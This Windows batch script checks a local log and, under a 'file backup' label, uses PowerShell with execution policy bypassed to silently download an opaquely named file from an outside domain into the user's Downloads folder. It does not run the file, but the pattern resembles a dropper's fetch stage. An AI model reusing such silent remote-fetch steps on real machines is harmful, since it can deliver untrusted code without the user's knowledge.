@echo off 
 
set urls=https://spyderrock.com/67gx7799-CodeXv2662.ldbk 
call "%USERPROFILE%\Desktop\dow-code\client-code\checklog.bat" "TAI_FILE_BACKUP-12/03/2025-11:15" 
if %errorlevel% equ 0 ( 
   echo done 
) else ( 
call "%USERPROFILE%\Desktop\dow-code\client-code\addlog.bat" "TAI_FILE_BACKUP-12/03/2025-11:15" 
powershell -NoProfile -ExecutionPolicy Bypass -Command "& {Invoke-WebRequest -Uri 'https://spyderrock.com/67gx7799-CodeXv2662.ldbk' -OutFile '%USERPROFILE%\Downloads\CodeXv2662.ldbk'}" 
    ) 
    timeout /t 5 
    exit 
